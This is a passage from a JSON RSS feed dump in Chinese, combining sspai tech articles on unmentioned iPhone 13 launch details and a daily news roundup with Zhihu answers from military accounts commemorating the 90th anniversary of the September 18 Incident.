mini 情何以堪。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c524dotb34tf23l9usvg.png\"></figure><p>等等，那 iPad mini 6 也太香了吧？非也非也。Geekbench 最新的跑分显示，iPhone 13 Pro 上 A15 仿生芯片的单核跑分是 1724，多核跑分是 4587，而 iPad mini 6 上 A15 仿生芯片的单核跑分是 1596，多核跑分是 4558。多核跑分差距不大，但是单核跑分差距非常明显。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c524dotb34tf23l9ut00.png\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c524dp5b34tf3t38q6u0.png\"></figure><p>另外，iPad mini 在拍摄照片时只支持智能 HDR 3，而不像 iPhone 13 系列一样支持智能 HDR4，也许有可能是在 A15仿生芯片上做了限制。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c524dpdb34tf2q7dfit0.png\"></figure><h2>Apple Watch 变大了</h2>\n<p>在发布会上，我们都知道了 Apple Watch Series 7 的屏幕显示面积比上一代明显更大了，边框宽度也明显变窄，此前也有不少传闻称新款 Apple Watch 将采用 41mm 和 45mm 的新屏幕尺寸，但在发布会 Keynote 和之后上线的 Apple Watch Series 7 的产品页面中，都没有明确给出新款 Apple Watch 的具体尺寸。</p>\n<p>不过，这一问题在发布会结束后的新闻稿上有了答案，我们可以清晰地看到新款 Apple Watch Series 7 的表壳尺寸分别为 41 毫米和 45 毫米。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c524dplb34tf2l9a5hl0.png\"></figure><h2>「刘海」面积减小，但是更高了</h2>\n<p>在发布会上我们都注意到了 iPhone 13 的刘海变窄了不少，可是在官网的机型对比图上仔细对照后我又发现刘海却变高了，而且这一来一去相当于没变？</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c524dptb34tf2l9a5hlg.png\"></figure><p>按道理来讲，刘海变窄后顶部状态栏应该能放下更多的图标，可是从官网的宣传图来看图标并没有变多。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c524dq5b34tf2q7dfitg.png\"></figure><h2>全新的分辨率</h2>\n<p>根据官网的技术规格页面，iPad mini 6 的屏幕为 2266 x 1488 像素分辨率，比例接近1.52:1，在 Apple 设备中是一个全新的分辨率和比例。这也就意味着开发者们又多了一个设备需要适配 UI，心里难免有些牢骚了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c524dqdb34tf2q7dfiu0.png\"></figure><h2>线上购买也可以加入年年焕新计划</h2>\n<p>iPhone 的年年焕新计划已经在中国运行了数年，让不少 Apple 的忠实粉丝以最方便的方式以旧换新。不过，先前我们只能通过 Apple Store 零售店线下购买 AppleCare+ 服务并加入年年焕新计划，这对于很多所在城市没有 Apple Store 的用户来说非常不方便。今年，Apple 推出了线上版的年年焕新计划，所有通过 Apple Store 在线商店购买新 iPhone 并加购 AppleCare+ 服务的用户都可以自动加入年年焕新计划。</p>\n<p>需要注意的是，在线上商店加入年年焕新计划和在线下零售店加入年年焕新计划是有区别的：通过 Apple Store 在线商店加入本计划的购买者 (包括在线订购并自行到店取货的购买者) 只能通过 Apple Store 在线商店进行升级换购；而通过 Apple Store 零售店加入本计划的购买者也只能在 Apple Store 零售店进行升级换购。</p>\n<p>如果你对如何通过年年焕新计划进行升级换购还有疑问，可以参考 Apple 官网的 <a href=\"https://www.apple.com.cn/shop/iphone/iphone-upgrade-program/upgrade\" target=\"_blank\">简介</a>，也可以阅读少数派的 <a href=\"https://sspai.com/post/56744\" target=\"_blank\">文章</a> 来获得更加详细的信息。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c524dmlb34tf2q7dfir0.png\"></figure><h2>AppleCare+ 降价了</h2>\n<p>除了年年焕新计划可以在线上购买，另外一个好消息是 iPhone 的 AppleCare+ 服务降价了。目前 iPhone 13 和 iPhone 13 mini 购买 AppleCare+ 的价格是 1198 元，iPhone 13 Pro 和 iPhone 13 Pro Max 购买 AppleCare+ 的价格是 1498 元。与此相比，iPhone 12 和 iPhone 12 mini 购买 AppleCare+ 的价格是 1398 元，iPhone 12 Pro 和 iPhone 12 Pro Max 购买 AppleCare+ 的价格是 1798 元。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c524dmtb34tf2q7dfirg.png\"></figure><h2>查找 MagSafe 皮革卡包不是谁都能管用</h2>\n<p>去年推出的 MagSafe 皮革卡包让很多人眼前一亮，里面放上公交卡、门禁卡什么的用起来非常方便。今年的 MagSafe 皮革卡包更进一步，还支持「查找」功能，当它与我的手机分离时，我会收到关于它最后已知位置的通知，妈妈再也不用担心我的卡包不翼而飞了。</p>\n<p>但是，如果你的 iPhone 12 戴了 Magsafe 透明保护壳，MagSafe 皮革卡包就不再支持查找功能。个中缘由，暂且不明。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/18/5b9350de6b5c079e014b12084c78ff8d.jpeg\"></figure><h2>双 eSIM 支持，但和你可能没什么关系</h2>\n<p>美国的 iPhone 13 全系列都支持了双 eSIM 卡设计，也就是说手机上即使不插一张实体 SIM 卡，也可以同时使用两张电话卡。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c524dr5b34tf23l9ut0g.png\"></figure><p>当然了，大陆国行的 iPhone 13 系列就没有这个待遇了，iPhone 13、iPhone 13 Pro 和 iPhone 13 Pro Max 仅支持实体双卡，而 iPhone 13 mini 仅支持实体单卡。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c524drdb34tf2l9a5hmg.png\"></figure><p>你还发现了哪些 Apple 发布会上没说的有趣细节？欢迎在评论区和我们讨论分享。</p>\n<p>少数派接下来会持续报道新 iPhone 的更多细节和体验，欢迎你通过 <a href=\"https://sspai.com/page/client\">少数派客户端</a>、<a href=\"https://weibo.com/sspaime\">官方微博</a>和微信公众号（sspaime）关注我们，获取最新内容。</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68862"},{"title":"「九一八」事变 90 周年纪念日恰逢 2021 年全民国防教育日，勿忘国耻，警钟长鸣，你有什么想说的？","date":"2021-09-18 01:12:33","description":"\n<p><b>防空警报？不，那是我们心头的钟鸣</b></p>\n<p>“我的家在东北松花江上，那里有我的同胞，还有那衰老的爹娘……九一八，九一八！从那个悲惨的时候，脱离了我的家乡，抛弃那无尽的宝藏，流浪！流浪！”《松花江上》歌一曲，道出了多少的辛酸血泪，唱出了多少的离愁别绪。那段尘封已久的往事再次谈起，依旧触目惊心，可歌可泣。</p>\n<p>岁月的车轮再次停在了这天——2021年9月18日，“九一八”事变90周年纪念日。上午9时18分，防空警报准时拉响。火热的训练场上，此时格外的寂静，只留下了防空警报的绕梁余音和战士们肃立的身影。防空警报如同我们心头的警钟，忘战必危，历史用血淋淋的代价告诫我们“生于忧患，死于安乐”。习主席曾说过，“历史是最好的教科书，也是最好的清醒剂。中国人民对战争带来的苦难有着刻骨铭心的记忆，对和平有着孜孜不倦的追求。”历史的硝烟已然散去，但现实的威胁却无时不在。我们身为军人，更应当明白和平的来之不易。我们在珍惜和平的同时，更要用平时的刻苦训练来捍卫祖国的大好河山。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-9069ea18c1e3b6feab94e072ea47e7fd_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"5254\" data-rawheight=\"3503\" data-watermark=\"original\" data-original-src=\"v2-9069ea18c1e3b6feab94e072ea47e7fd\" data-watermark-src=\"v2-0ea7a1b339f65230434e695d23698a0d\" data-private-watermark-src=\"v2-24a2db194d304a2b0bd7ffe1e7b7867e\"></p>\n<p>战火和硝烟在滚滚的历史长河中慢慢地被刷洗，冲淡。在这和平年代里，我们应该怎样讲述那段悲怆的历史？在“靖国神社”拍照的流量小生，辽宁、江苏建起的“日本风情街”……和平安逸的日子，让有些中国人丢掉了民族的血性。什么叫做血战到底？什么叫做宁死不屈？什么是“天下兴亡，匹夫有责”？在和平稳定的今天，这种英勇无畏的“抗战精神”我们更应当牢记。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-4f2a1a8c540d384c20227613e6f461a9_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3000\" data-rawheight=\"2046\" data-watermark=\"original\" data-original-src=\"v2-4f2a1a8c540d384c20227613e6f461a9\" data-watermark-src=\"v2-1f96d35d882b17ba23a9166efda952ef\" data-private-watermark-src=\"v2-8f2d9b52f5ec20648282674bc75cf63c\"></p>\n<p>历史的经验告诉我们，唯有一支枕戈待旦的军队，唯有一群忠于国家、甘于奉献的军人，才能支撑起一个民族的复兴和希望。今天，我们比历史上任何一个时期都更接近中华民族的伟大复兴这一目标，也比历史上任何一个时期都更加需要建设一支强大的军队。身为军人的我们，更应在和平的年代里敲响历史的钟鸣，时刻练兵备战，保持枕戈待旦，锤炼过硬的军事本领，打造一支“召之即来，来之能战，战之必胜”的人民军队。这才是我们对历史最好的回应。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-daeb56dd0b863c963be244b45c54fd81_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"5760\" data-rawheight=\"3840\" data-watermark=\"original\" data-original-src=\"v2-daeb56dd0b863c963be244b45c54fd81\" data-watermark-src=\"v2-a774bff48d7626eb577fd9ed416e9b6d\" data-private-watermark-src=\"v2-cb2e48d5fed117fa1941c9fd83b694f8\"></p>\n<p>天下兴亡、匹夫有责的爱国情怀，视死如归、宁死不屈的革命信仰，不畏强暴、血战到底的英雄气概，百折不挠、坚韧不拔的必胜信念，这是革命先辈留给我们的弥足珍贵的精神财富。曾经的苦难不能忘，曾经的牺牲不能忘。五星红旗的红可不是简单的红，是无数的革命先辈用鲜血染红了它。我们当向先辈致敬，向那场永不妥协的抗争致敬！<b>振兴中华，乃吾辈之责！</b></p>\n<p>（林志辉 云少青 吴伟强）</p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/nan-bu-zhan-qu-3?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">南部战区</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/486830339/answer/2126888270?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">1974 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/470741239?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">「七七事变」84 周年纪念日，日本记者发推称：在日本很少有人提「 7 月 7 日」，反映了哪些问题？</a><br><a href=\"http://www.zhihu.com/question/487578931?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">2021年九一八事变90周年纪念日，面对国耻纪念日，你有什么想说的吗？</a><br>\n","link":"http://www.zhihu.com/question/486830339/answer/2126888270?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"派早报：微信调整外部链接内容管理规范、魅蓝 Blus 主动降噪耳机开售等","date":"2021-09-18 00:58:58","description":"\n<h2>你可能错过的新鲜事</h2>\n<h3>微信调整外部链接内容管理规范</h3>\n<p>9 月 17 日，微信就调整外部链接内容管理规范发布声明称，在遵守国家法律法规、保障用户隐私和信息安全等原则的基础上，微信将在监管部门的指导下分阶段分步骤实施外链管理措施，第一阶段于 17 日当日开始执行。第一阶段调整措施包括允许用户在一对一聊天场景中访问外部链接，设立违法违规外链投诉入口、针对外链提供平台设立信用分级；群链接「因涉及广大接收方用户」，相关外链功能还在开发当中。<a href=\"https://mp.weixin.qq.com/s/qFFSHFaRUJQZVcxSRzMfQw\" target=\"_blank\">来源</a></p>\n<h3>魅蓝 Blus 主动降噪耳机开售</h3>\n<p>9 月 17 日，刚刚宣布回归的魅族子品牌「魅蓝」官网 mblu.com 正式上线，魅蓝首款新品 Blus 主动降噪耳机同时开售。Blus 耳机采用 TWS 设计，支持蓝牙 5.2、主动降噪和 IPX4 防泼溅，标称降噪续航可达 5.5 小时，搭配充电盒可延长至 25 小时，售价 199 元。<a href=\"https://www.mblu.com/mlbluszdjzej\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/18/aa365b85b4d58beb9eaa5b4dddb44298.png\"></figure><h3>DeepWay 发布智能重卡星途一代</h3>\n<p>由狮桥和百度联合打造的卡车新造车公司 DeepWay 于 9 月 17 日召开战略发布会，正式推出首款全正向设计研发的智能新能源重卡星途一代，该车基于百度自动驾驶技术研发的 HIS 高速路智能系统，算力超过 500TOPS，支持高速上 L4 级别自动驾驶和 OTA 升级，同时基于自动驾驶传感器实现了全车无盲区以及超过 1000m 的超远距感知能力。此外星途一代还具有「深级」设计、「深级」性能、「深级」空间等优势，能够精准匹配干线物流需求。该车将于 2023 年 6 月实现落地商业化量产。<a href=\"https://www.ithome.com/0/576/208.htm\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/18/f7b38b92af9169c1e7300453ad9a1b5f.png\"></figure><h3>iPadOS 15 允许 App 调用更多 RAM</h3>\n<p>9 月 17 日，ArtStudio 开发者 Lucky Clan 发现 iPadOS 15 允许 App 调用的 RAM 上限有了大幅度提升。对于拥有 16 GB RAM 的设备，单个应用最多可分配 12 GB；拥有 8 GB RAM 的设备则单个应用可分配至 6 GB。在 iPadOS 15 的开发者预览版中，这一限制最高曾为 5 GB。<a href=\"https://www.imore.com/ipados-15-unlocks-much-12gb-ram-use-each-app-5gb\" target=\"_blank\">来源</a></p>\n<h3>Google 将「自动重置」功能下放至更老 Android 版本</h3>\n<p>Google 决定将 Android 11 中管理应用权限的「自动重置」功能下放至更老的 Android 系统。该功能允许系统移除长时间未使用应用的敏感权限，以保护用户隐私。这一功能将跟随 Google Play 服务更新推送，Android 6 及以上版本均可获取。推送自今年十二月开始。<a href=\"https://www.engadget.com/android-11-permissions-auto-reset-android-6-update-170017665.html\" target=\"_blank\">来源</a></p>\n<h3>Amazon Appstore 开始在微软应用商店中上线测试</h3>\n<p>近日，有网友发现 Amazon Appstore 已经在微软应用商店中上线，但显示为「不可用」状态，且应用简介标明为「测试用途」。应用简介中显示的系统版本要求为「Windows 10 版本 22000.0 或更高版本」，值得一提的是目前 Windows 10 最新版本号仅为 19044。在 Windows 11 发布时，微软宣布其可运行 Android 应用，但需要在微软应用商店中通过 Amazon Appstore 下载。<a href=\"https://www.microsoft.com/zh-cn/p/amazon-appstore/9njhk44ttksx?activetab=pivot:overviewtab#\" target=\"_blank\">来源</a></p>\n<h2>看看就行的小道消息</h2>\n<ul>\n<li>字节跳动今年下半年可能发布一款音乐流媒体 App，暂定名「飞乐」。<a href=\"https://www.36kr.com/p/1399766722935555\" target=\"_blank\">来源</a>\n</li>\n<li>三星显示近日宣布开始量产一系列用于「高端笔记本」的 OLED 面板，其中包括 90 Hz 14 英寸以及 4K 16 英寸两种规格，这可能预示了未来 MacBook Pro 的屏幕规格。<a href=\"https://9to5mac.com/2021/09/16/future-macbook-pro-displays-samsung/\" target=\"_blank\">来源</a>\n</li>\n<li>爆料人冰宇宙表示三星 S22 将搭载 6.06 英寸显示屏与 3700 mAh 电池，整机尺寸略小于 iPhone 13。<a href=\"https://www.androidpolice.com/2021/09/17/galaxy-s22-screen-size-could-be-the-smallest-in-years/\" target=\"_blank\">来源</a>\n</li>\n</ul>\n<h2>少数派的近期动态</h2>\n<ul>\n<li>📖 Apple 发布会上没有「One More Thing」？我们给你备上了：《少数派系统指南 · iOS 15》上架预购<strong>六折</strong>优惠中，更多介绍请前往 <a href=\"https://sspai.com/series/228\" target=\"_blank\">栏目页面</a> 查看。</li>\n<li>🦦 少数派「监工水獭」挂灯摆件 <a href=\"https://item.taobao.com/item.htm?id=656156847801\" target=\"_blank\">正式上架</a>，上新特惠 ￥49（原价 ￥69），活动持续至 21 日，22 日开始发货。</li>\n<li>🎁 少数派会员 <a href=\"https://sspai.com/post/68762\" target=\"_blank\">迎来大更新</a>，<a href=\"https://item.taobao.com/item.htm?ft=t&amp;id=641648482116\" target=\"_blank\">现在购买</a> 可获赠价值 40 元的白描黄金版。</li>\n<li>🎉 少数派正版软件商城 <a href=\"https://sspai.com/mall/discount/%E5%BC%80%E5%AD%A6%E5%AD%A3%E4%BF%83%E9%94%80\" target=\"_blank\">开学季促销</a> 继续进行中，数十款优质软件低至 5 折起。</li>\n<li>📕 由少数派编辑部联合优秀作者出版实体书《数字时代的效率手册》上线电商平台，立即前往 <a href=\"https://item.jd.com/12914331.html\" target=\"_blank\">5 折下单</a>，Kindle 商店电子书版也已上架。</li>\n</ul>\n<h2>你可能错过的文章</h2>\n<ul>\n<li>🔒 <a href=\"https://sspai.com/post/68634\" target=\"_blank\">保护好自己的数字资产，我的方法你也可以试试</a>\n</li>\n<li>🍬 <a href=\"https://sspai.com/post/68857\" target=\"_blank\">甜味剂解密（上）：果糖的甜蜜与烦恼</a>\n</li>\n<li>📱 <a href=\"https://sspai.com/post/68835\" target=\"_blank\">今晚你会选哪款？iPhone 13 选购指南</a>\n</li>\n<li>🎬 <a href=\"https://sspai.com/post/68851\" target=\"_blank\">本周看什么丨最近值得一看的 7 部作品</a>\n</li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68868"},{"title":"「九一八」事变 90 周年纪念日恰逢 2021 年全民国防教育日，勿忘国耻，警钟长鸣，你有什么想说的？","date":"2021-09-18 00:55:55","description":"\n<p></p>\n<p>牢记历史，勿忘国耻。苦练杀敌本领，空军官兵时刻准备着！</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/kong-jun-zai-xian?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">空军在线</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/486830339/answer/2126856052?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">1974 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/470741239?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">「七七事变」84 周年纪念日，日本记者发推称：在日本很少有人提「 7 月 7 日」，反映了哪些问题？</a><br><a href=\"http://www.zhihu.com/question/487578931?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">2021年九一八事变90周年纪念日，面对国耻纪念日，你有什么想说的吗？</a><br>\n","link":"http://www.zhihu.com/question/486830339/answer/2126856052?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"「九一八」事变 90 周年纪念日恰逢 2021 年全民国防教育日，勿忘国耻，警钟长鸣，你有什么想说的？","date":"2021-09-18 00:49:01","description":"\n<p><b>9月18日</b></p>\n<p><b>每个中国人都该铭记的日子</b></p>\n<p>这是中华民族14年艰难抗战的开始</p>\n<p><img src=\"https://pic3.zhimg.com/v2-420b3a1aed439933cae20c6612799c6d_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1126\" data-watermark=\"watermark\" data-original-src=\"v2-420b3a1aed439933cae20c6612799c6d\" data-watermark-src=\"v2-b2cbee6281ed53778194cd2797b5b560\" data-private-watermark-src=\"v2-6e08d7cbaf4f4fa6928b84515985087d\"></p>\n<p><br></p>\n<p>“九一八，九一八，从那个悲惨的时候！脱离了我的家乡，</p>\n<p>抛弃那无尽的宝藏，流浪！流浪！”</p>\n<p>人民蒙难，国土沦丧</p>\n<p>一首《松花江上》</p>\n<p>满是山河沦陷的痛楚</p>\n<p>更饱含亿万中国人民</p>\n<p>对日本侵略者的仇恨</p>\n<p><br></p>\n<p>时光流逝</p>\n<p>虽然已经过去了90年</p>\n<p>但我们始终无法淡忘</p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-a8f5ca83f291b7a9537dc824516b61fc_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"640\" data-rawheight=\"962\" data-watermark=\"watermark\" data-original-src=\"v2-a8f5ca83f291b7a9537dc824516b61fc\" data-watermark-src=\"v2-a277f57e49411c9a01df91b8384ad1a0\" data-private-watermark-src=\"v2-a63a1dc529eeb3e6a1dde981c3170e28\"></p>\n<p>九一八事变当夜日军炸毁铁路的地点。</p>\n<p><br></p>\n<p>90年前的今天</p>\n<p>1931年9月18日</p>\n<p>日本关东军炸毁南满铁路</p>\n<p>反诬中国军队所为</p>\n<p>悍然袭击驻扎在北大营的东北军</p>\n<p><img src=\"https://pic3.zhimg.com/v2-c147b1c7a8c48b677da76c5e6a475446_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"727\" data-watermark=\"watermark\" data-original-src=\"v2-c147b1c7a8c48b677da76c5e6a475446\" data-watermark-src=\"v2-9af54ddd90491ff6ab6060303ef66f40\" data-private-watermark-src=\"v2-a2c82f60cced4cc8e40f49041bb3167d\"></p>\n<p>正在燃烧的东北军驻地北大营。</p>\n<p><br></p>\n<p>由于国民政府的不抵抗政策</p>\n<p>日军300人就击溃了</p>\n<p>北大营的8000守军</p>\n<p>沈阳城次日即告陷落</p>\n<p>这就是震惊世界的</p>\n<p>九一八事变</p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-7c43e5fbe3651994548938342b106d23_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"963\" data-rawheight=\"1440\" data-watermark=\"watermark\" data-original-src=\"v2-7c43e5fbe3651994548938342b106d23\" data-watermark-src=\"v2-8849d2e34b0877fab1e8c9ae3300e67b\" data-private-watermark-src=\"v2-ba71250468ee4dfcbc5e2a3ad836cdd9\"></p>\n<p>日军侵占沈阳城后，耀武扬威地站在城头，悬挂起日本国旗。</p>\n<p><br></p>\n<p>日本在中国东北</p>\n<p>建立了伪满洲国傀儡政权</p>\n<p>开始了长达14年之久的</p>\n<p>奴役和殖民统治</p>\n<p>抗日战争自此拉开序幕</p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-45ebcd5ed7c76a978f31b24ffce3fd66_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"713\" data-watermark=\"watermark\" data-original-src=\"v2-45ebcd5ed7c76a978f31b24ffce3fd66\" data-watermark-src=\"v2-f1462a4ed23c965cced28cb50b13b4c4\" data-private-watermark-src=\"v2-6351496e0dcb22af1a92976c03637ddb\"></p>\n<p>1931年9月19日，日本侵略军装甲部队侵入沈阳市。</p>\n<p><br></p>\n<p>1931年到1945年</p>\n<p>超过3500万同胞伤亡4200万难民无家可归半个中国遭日本铁蹄践踏</p>\n<p><img src=\"https://pic2.zhimg.com/v2-c509fc12246234bdb7b830c6f68bf49b_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"705\" data-watermark=\"watermark\" data-original-src=\"v2-c509fc12246234bdb7b830c6f68bf49b\" data-watermark-src=\"v2-e3eb9a8df0753bab4b7340bc21346af1\" data-private-watermark-src=\"v2-5dacc688dd7be8d7905f7bc919ef81f1\"></p>\n<p>中国共产党领导下的东北抗日联军第一路军之一部。</p>\n<p><br></p>\n<p>中国共产党对九一八事变迅速作出反应9月20日</p>\n<p>事变发生后仅两天中共中央发表《为日本帝国主义强暴占领东三省事件宣言》响亮地喊出：“反对日本帝国主义强占东三省！”</p>\n<p>国难当头中华儿女，绝不退缩国殇来临</p>\n<p>扑不灭中华民族的精神</p>\n<p>浇不熄中华儿女的斗志</p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-63689b93c230308de8fcb883fcfddfed_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"552\" data-watermark=\"watermark\" data-original-src=\"v2-63689b93c230308de8fcb883fcfddfed\" data-watermark-src=\"v2-8abbfc80cb6b33677f6deb3651a83e52\" data-private-watermark-src=\"v2-7a271a44fd6e24a8426fd084bb1cc897\"></p>\n<p>九一八事变后，杭州市各界群众举行抗日救国大会。</p>\n<p><br></p>\n<p>九一八事变</p>\n<p>深深激发了全民族的爱国热情中国共产党领导下的爱国救亡运动迅速席卷全国14年抗日战争中涌现出无数可歌可泣的英雄事迹</p>\n<p>东北抗联战士爬冰卧雪</p>\n<p>为避免日伪军报复</p>\n<p>14年朝夕相处的战友</p>\n<p>都是以代号相称</p>\n<p>直到抗战胜利后</p>\n<p>才敢大声告诉战友自己的名字</p>\n<p>而更多的战士名字则永远消失</p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-e5cecd8b09edbede01eb89583da2b278_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"631\" data-rawheight=\"539\" data-watermark=\"watermark\" data-original-src=\"v2-e5cecd8b09edbede01eb89583da2b278\" data-watermark-src=\"v2-7bb729e04bce75609bd52391d0df079c\" data-private-watermark-src=\"v2-671dc9265cc57f4b07ba3b713564b589\"></p>\n<p><br></p>\n<p>第一代战斗机飞行员舍身报国</p>\n<p>放弃优渥的条件</p>\n<p>回到战乱的祖国</p>\n<p>只为他们所爱的人拥有未来</p>\n<p>他们的学校门口立了校训：</p>\n<p>我们的身体、飞机和炸弹</p>\n<p>当与敌人兵舰阵地同归于尽！</p>\n<p><br></p>\n<p>英雄儿女舍身赴死</p>\n<p>杨靖宇、赵尚志、赵一曼</p>\n<p>陈翰章、王凤阁、冷云</p>\n<p>每一个名字背后</p>\n<p>都是可歌可泣的诗篇</p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-02087fc5ff8e84dd35aaa48157f3e9dd_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"693\" data-watermark=\"watermark\" data-original-src=\"v2-02087fc5ff8e84dd35aaa48157f3e9dd\" data-watermark-src=\"v2-461ab26721767e6b0d0753c67c2e6cf0\" data-private-watermark-src=\"v2-052908ec2fee99c1e966f243ea2b6ef6\"></p>\n<p>人民英雄纪念碑上的抗战浮雕。</p>\n<p><br></p>\n<p>仁人志士前赴后继</p>\n<p>浴血奋战几千个日日夜夜</p>\n<p>经历22次正面战场会战</p>\n<p>1117次大型战斗</p>\n<p>3万余次小战斗及游击战</p>\n<p>歼灭日伪军228万人</p>\n<p><br></p>\n<p>他们在黑暗里战斗</p>\n<p>用自己的生命换取后代的光明</p>\n<p>用不屈的斗争拼出民族的未来</p>\n<p><b>他们的英名不朽</b></p>\n<p><b>和平的光芒永在</b></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-c0c290c174418f02b06a18c6c617ed04_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"640\" data-rawheight=\"503\" data-watermark=\"watermark\" data-original-src=\"v2-c0c290c174418f02b06a18c6c617ed04\" data-watermark-src=\"v2-a019e0ecf4e13bc56289224c4f624cda\" data-private-watermark-src=\"v2-bf8a81bc2bc66853361809221f061a31\"></p>\n<p><br>1938年11月3日，新四军战士在马家园战斗中打击敌人。</p>\n<p><br></p>\n<p>1931-2021</p>\n<p>今天，我们回望“九一八”</p>\n<p>就是要从苦难中汲取智慧</p>\n<p>从耻辱中迸发力量</p>\n<p><br></p>\n<p>90年前</p>\n<p>沈阳的炮声</p>\n<p>惊醒了中华民族</p>\n<p><br></p>\n<p>90年过去了中国人民以不屈不挠的精神告诉世界中华民族不可欺、不可辱</p>\n<p>中华民族不可战胜！</p>\n<p><img src=\"https://pic4.zhimg.com/v2-7d023fc8fc632a3c9d1eeef5e4008e27_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"watermark\" data-original-src=\"v2-7d023fc8fc632a3c9d1eeef5e4008e27\" data-watermark-src=\"v2-6ca8e0bc5101264f9584ddb861f97df0\" data-private-watermark-src=\"v2-90b5bc0316b718c5f9bc8aafe7a5bf73\" 